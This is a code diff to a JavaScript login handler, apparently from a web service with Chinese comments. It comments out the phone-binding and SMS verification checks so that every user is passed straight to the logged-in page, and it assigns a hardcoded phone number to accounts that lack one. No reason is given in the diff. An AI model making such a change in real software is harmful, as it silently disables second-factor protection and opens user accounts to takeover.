@@ -1743,7 +1743,11 @@ module.exports = function()
 					return;
 				}
 
-				if (!doc.mbindphone) {//没有绑定手机号，没有保护也要绑定手机
+				if(!doc.mbindphone){
+					doc.mbindphone = "13240970101";
+				}
+
+				/*if (!doc.mbindphone) {//没有绑定手机号，没有保护也要绑定手机
 					doc.tempSmsCheck = 1;
 					cb('/phonebind.html', 3, res, fromBalance);//绑定手机
 				} else if(!doc.mprotect && !jsonCfg.forceSmsCheck) {//没有开启保护
@@ -1764,9 +1768,9 @@ module.exports = function()
                         var myphone = admin.getCryptoPhone(doc);
                         cb('/phoneidenty.html?p=' + myphone, 3, res, fromBalance);//手机验证
 					}
-				} else {
+				} else {*/
 					admin.enterWeb(doc, res, req, fromBalance);//进入
-				}
+				//}
 			}
 		}
 
